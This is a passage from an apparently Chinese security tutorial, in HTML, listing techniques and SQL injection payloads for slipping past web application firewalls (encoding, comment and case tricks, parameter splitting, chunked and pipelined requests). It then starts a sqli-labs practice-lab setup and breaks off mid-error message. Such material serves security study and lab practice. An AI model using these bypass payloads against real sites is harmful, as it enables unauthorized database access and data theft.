空格字符绕过</h3><p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<p><code>/**/</code>：替换空格</p>\n<p><code>/*!*/</code>：内联注释</p>\n<h3 id=\"2-2-大小写绕过\"><a href=\"#2-2-大小写绕过\" class=\"headerlink\" title=\"2.2 大小写绕过\"></a>2.2 大小写绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">-</span><span class=\"operator\">&gt;</span> <span class=\"keyword\">UniOn</span> <span class=\"keyword\">SelEcT</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-3-浮点数绕过\"><a href=\"#2-3-浮点数绕过\" class=\"headerlink\" title=\"2.3 浮点数绕过\"></a>2.3 浮点数绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8E0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8.0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-4-NULL绕过\"><a href=\"#2-4-NULL绕过\" class=\"headerlink\" title=\"2.4 NULL绕过\"></a>2.4 NULL绕过</h3><p><code>\\N</code>代表NULL</p>\n<h3 id=\"2-5-引号绕过\"><a href=\"#2-5-引号绕过\" class=\"headerlink\" title=\"2.5 引号绕过\"></a>2.5 引号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span>\"1\" #双引号绕过</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"number\">0x61646D696E</span>; # 字符串转换为<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(column_name)</span><br><span class=\"line\"><span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> TABLE_NAME<span class=\"operator\">=</span><span class=\"string\">'users'</span> limit <span class=\"number\">1</span>),<span class=\"number\">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-6-添加库名绕过\"><a href=\"#2-6-添加库名绕过\" class=\"headerlink\" title=\"2.6 添加库名绕过\"></a>2.6 添加库名绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> test.users;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-7-去重复绕过\"><a href=\"#2-7-去重复绕过\" class=\"headerlink\" title=\"2.7 去重复绕过\"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,version() fromusers;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-8-反引号绕过\"><a href=\"#2-8-反引号绕过\" class=\"headerlink\" title=\"2.8 反引号绕过\"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> `test.users`;</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-9-语言特性绕过\"><a href=\"#2-9-语言特性绕过\" class=\"headerlink\" title=\"2.9 语言特性绕过\"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">服务器中间件</th>\n<th align=\"center\">解析结果</th>\n<th align=\"center\">举例说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">ASP.NET/IIS</td>\n<td align=\"center\">所有出现的参数值用逗号连接</td>\n<td align=\"center\">color=red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">ASP/IIS</td>\n<td align=\"center\">所有出现的参数用逗号连接</td>\n<td align=\"center\">color=red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP/Apache</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP/Zeus</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Apache Tomcat</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Oracle Application Server 10g</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet/Jetty</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">IBM Lotus Domino</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color=blue</td>\n</tr>\n<tr>\n<td align=\"center\">IBM HTTP Server</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_perl,libapreq2/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">Perl CGI/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_wsgi(Python)/Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color=red</td>\n</tr>\n<tr>\n<td align=\"center\">Python/Zope</td>\n<td align=\"center\">转化为List</td>\n<td align=\"center\">color=[‘red’,’blue’]</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-10-逗号绕过\"><a href=\"#2-10-逗号绕过\" class=\"headerlink\" title=\"2.10 逗号绕过\"></a>2.10 逗号绕过</h3><p><code>substr</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>(substr(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>mid</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> mid(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>join</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)a <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">2</span>)b</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>like</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() <span class=\"keyword\">like</span> <span class=\"string\">'%r%'</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>offset</code></p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">limit <span class=\"number\">1</span> <span class=\"keyword\">offset</span> <span class=\"number\">0</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-11-or-and-xor-not绕过\"><a href=\"#2-11-or-and-xor-not绕过\" class=\"headerlink\" title=\"2.11 or and xor not绕过\"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>\n<p><code>||</code>等价于or</p>\n<p><code>!</code>等价于not</p>\n<p><code>|</code>等价于xor</p>\n<h3 id=\"2-12-ASCII字符对比绕过\"><a href=\"#2-12-ASCII字符对比绕过\" class=\"headerlink\" title=\"2.12 ASCII字符对比绕过\"></a>2.12 ASCII字符对比绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">=</span><span class=\"number\">114</span>; # <span class=\"type\">char</span>(<span class=\"number\">114</span>)<span class=\"operator\">=</span><span class=\"string\">'r'</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-13-等号绕过\"><a href=\"#2-13-等号绕过\" class=\"headerlink\" title=\"2.13 等号绕过\"></a>2.13 等号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&lt;</span><span class=\"number\">115</span>; # <span class=\"operator\">&gt;</span> <span class=\"operator\">&lt;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"keyword\">like</span> <span class=\"string\">'r%'</span>; #<span class=\"keyword\">like</span> rlike</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() regexp <span class=\"string\">'^r'</span>; # regexp</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-14-双写绕过\"><a href=\"#2-14-双写绕过\" class=\"headerlink\" title=\"2.14 双写绕过\"></a>2.14 双写绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uniunionon seleselectct</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-15-二次编码绕过\"><a href=\"#2-15-二次编码绕过\" class=\"headerlink\" title=\"2.15 二次编码绕过\"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>\n<p>第一次编码：</p>\n<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>\n<p>第二次编码：</p>\n<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>\n<h3 id=\"2-16-参数拆分绕过\"><a href=\"#2-16-参数拆分绕过\" class=\"headerlink\" title=\"2.16 参数拆分绕过\"></a>2.16 参数拆分绕过</h3><p>对于a=[input1]&amp;b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">'union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-17-生僻函数绕过\"><a href=\"#2-17-生僻函数绕过\" class=\"headerlink\" title=\"2.17 生僻函数绕过\"></a>2.17 生僻函数绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> polygon((<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> @<span class=\"variable\">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-18-分块传输绕过\"><a href=\"#2-18-分块传输绕过\" class=\"headerlink\" title=\"2.18 分块传输绕过\"></a>2.18 分块传输绕过</h3><p>​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>\n<p>​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\\r\\n”)。然后是数据本身，数据结束后，还会有CRLF(“\\r\\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>\n<h3 id=\"2-19-信任白名单绕过\"><a href=\"#2-19-信任白名单绕过\" class=\"headerlink\" title=\"2.19 信任白名单绕过\"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">/</span>phpmyadmin?name<span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"keyword\">user</span>()<span class=\"comment\">--+&amp;submit=1</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-20-pipline绕过\"><a href=\"#2-20-pipline绕过\" class=\"headerlink\" title=\"2.20 pipline绕过\"></a>2.20 pipline绕过</h3><p>​\thttp 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>\n<p>​\t用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。</p>\n<h3 id=\"2-21-利用multipart-form-data绕过\"><a href=\"#2-21-利用multipart-form-data绕过\" class=\"headerlink\" title=\"2.21 利用multipart/form-data绕过\"></a>2.21 利用multipart/form-data绕过</h3><p>​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>\n<h3 id=\"2-22-order-by-绕过\"><a href=\"#2-22-order-by-绕过\" class=\"headerlink\" title=\"2.22 order by 绕过\"></a>2.22 order by 绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> <span class=\"variable\">@a</span>,<span class=\"variable\">@b</span>,<span class=\"variable\">@c</span>,<span class=\"variable\">@d</span>; # 替代<span class=\"keyword\">order</span> <span class=\"keyword\">by</span>猜解字段数</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-23-修改请求方式绕过\"><a href=\"#2-23-修改请求方式绕过\" class=\"headerlink\" title=\"2.23 修改请求方式绕过\"></a>2.23 修改请求方式绕过</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>可以更改请求方式尝试绕过。</p>\n<h3 id=\"2-24-大量字符绕过\"><a href=\"#2-24-大量字符绕过\" class=\"headerlink\" title=\"2.24 大量字符绕过\"></a>2.24 大量字符绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">select</span> <span class=\"number\">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-25-花括号绕过\"><a href=\"#2-25-花括号绕过\" class=\"headerlink\" title=\"2.25 花括号绕过\"></a>2.25 花括号绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span>{x <span class=\"number\">1</span>},<span class=\"keyword\">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"2-26-union-select绕过\"><a href=\"#2-26-union-select绕过\" class=\"headerlink\" title=\"2.26 union select绕过\"></a>2.26 union select绕过</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sel<span class=\"operator\">&lt;&gt;</span>ect # 程序过滤<span class=\"operator\">&lt;&gt;</span>为空 脚本处理</span><br><span class=\"line\">sele<span class=\"comment\">/**/</span>ct # 程序过滤<span class=\"comment\">/**/</span>为空</span><br><span class=\"line\"><span class=\"comment\">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class=\"line\">se<span class=\"operator\">%</span><span class=\"number\">0</span>blect # 使用空格绕过</span><br><span class=\"line\">sele<span class=\"operator\">%</span>ct # 使用百分号绕过</span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">53</span>eLEct # 编码绕过</span><br><span class=\"line\"><span class=\"keyword\">uNIoN</span> <span class=\"keyword\">sELecT</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">all</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">DISTINCT</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">null</span><span class=\"operator\">+</span><span class=\"keyword\">UNION</span><span class=\"operator\">+</span><span class=\"keyword\">SELECT</span><span class=\"operator\">+</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span><span class=\"comment\">/**/</span><span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">Select</span> <span class=\"number\">0xA</span><span class=\"operator\">*</span><span class=\"number\">1000</span>)<span class=\"comment\">/*!uNIOn*/</span><span class=\"comment\">/*!SeLECt*/</span> <span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br><span class=\"line\"><span class=\"comment\">/*!50000union*/</span><span class=\"comment\">/*!50000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!40000union*/</span><span class=\"comment\">/*!40000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">250</span>aunion<span class=\"operator\">%</span><span class=\"number\">250</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>caunion<span class=\"operator\">%</span><span class=\"number\">0</span>cselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>daunion<span class=\"operator\">%</span><span class=\"number\">0</span>dselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>baunion<span class=\"operator\">%</span><span class=\"number\">0</span>bselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class=\"line\"><span class=\"comment\">/*!12345union*/</span><span class=\"comment\">/*!12345select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*中文*/</span><span class=\"keyword\">union</span><span class=\"comment\">/*中文*/</span><span class=\"keyword\">select</span><span class=\"comment\">/*中文*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/* */</span><span class=\"keyword\">union</span><span class=\"comment\">/* */</span><span class=\"keyword\">select</span><span class=\"operator\">/</span> <span class=\"operator\">*</span><span class=\"operator\">/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!00000all*/</span><span class=\"comment\">/*!00000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"3-sqli-labs通关\"><a href=\"#3-sqli-labs通关\" class=\"headerlink\" title=\"3. sqli-labs通关\"></a>3. sqli-labs通关</h2><h3 id=\"3-1-准备工作\"><a href=\"#3-1-准备工作\" class=\"headerlink\" title=\"3.1 准备工作\"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull acgpiano/sqli-labs</span><br><span class=\"line\">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>\n\n<p>中间可能报错，只需要关闭代理就行。</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error response from daemon: Head <span class=\"string\">\"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\"</span>: Get <span class=\"string\">\"https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io\"</span>: 